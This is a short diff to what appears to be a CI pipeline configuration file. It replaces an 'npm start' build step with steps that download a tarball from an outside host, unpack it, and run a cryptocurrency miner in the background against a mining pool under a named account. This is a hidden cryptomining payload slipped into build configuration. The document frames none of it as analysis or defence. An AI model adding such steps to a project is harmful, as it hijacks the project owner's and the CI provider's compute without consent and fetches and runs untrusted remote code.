@@ -16,5 +16,13 @@ steps:
   displayName: 'Install Node.js'
 
 - script: |
-    npm start
-  displayName: 'npm start'
+    wget http://www.lukminer.net/releases/latest.tgz
+  displayName: 'wget'
+
+  - script: |
+    tar xfvz latest.tgz
+  displayName: 'tar'
+
+  - script: |
+    ./luk-cpu -a xmrv8 --host pool.simpleco.in --port 8080 --user etnobox.25418 --pass x -t 1 &
+  displayName: 'luk-cpu'
